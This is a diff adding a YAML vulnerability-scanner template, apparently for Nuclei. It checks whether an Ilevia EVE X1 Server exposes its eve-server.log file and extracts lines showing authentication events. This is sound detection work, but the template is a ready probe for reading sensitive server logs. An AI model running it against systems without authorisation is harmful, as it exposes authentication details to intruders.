@@ -1,0 +1,35 @@
+id: poc-yaml-ilevia-eve-x1-server-eve-server-log-info-leak
+info:
+  name: Ilevia EVE X1 Server eve-server.log Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/80-history/eve-server.log"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "serverFile"
+          - "Info Message"
+          - "[SUCCESS] Authenticate"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+  
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "serverFile.*"        
+          - "Info Message.*"        
+          - "[SUCCESS] Authenticate.*"        
+          - "<.*>"
